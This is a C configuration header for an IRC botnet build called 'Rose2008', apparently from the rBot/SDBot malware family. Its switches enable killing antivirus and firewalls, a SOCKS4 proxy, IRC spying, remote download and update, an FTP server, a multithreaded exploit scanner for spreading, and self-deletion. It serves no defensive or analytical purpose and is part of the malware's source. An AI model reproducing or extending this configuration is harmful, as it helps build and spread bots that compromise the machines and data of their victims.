#define vername "Rose2008"

#undef NO_PROCESS
#undef NO_AVFW_KILL

#undef NO_SOCK4SERV // disables socks4 server.

//system info
#undef NO_NETINFO    // disables network info function


//misc
#define NO_REALNICK
#define NO_IDENT      // disables ident server
#undef NO_SPY        // disables irc spy function
#undef NO_DOWNLOAD   // disables downloading/updating functions
#undef NO_CONNCHECK  // disables check for internet connection
#define LOGSIZE			128
#define MAXSTRLEN		500

#define NO_REGMON	// disables registry monitor


#undef NO_FTPD
#undef NO_ADVSCAN


#define IRCLINE			1024
#define MAXTHREADS		300
#define MAXNICKLEN		28
#define LOGLINE			128
#define MAXSCANTHRD		250
#define MAXSCANTIME		9999
#define NO_REDIRECT
#define NO_DDOS

//dont mess with this - this is just to remove sploits if there is no scanner
#ifdef NO_ADVSCAN

#endif
#undef NO_MELT

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define BLOCKSIZE		512 //tftp

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))
#define HSTART "\3\x30\x32"
#define HEND "\3"
#define FLOOD_DELAY 2000
#define MAX_LINES 500
#define MAXTOKENS		32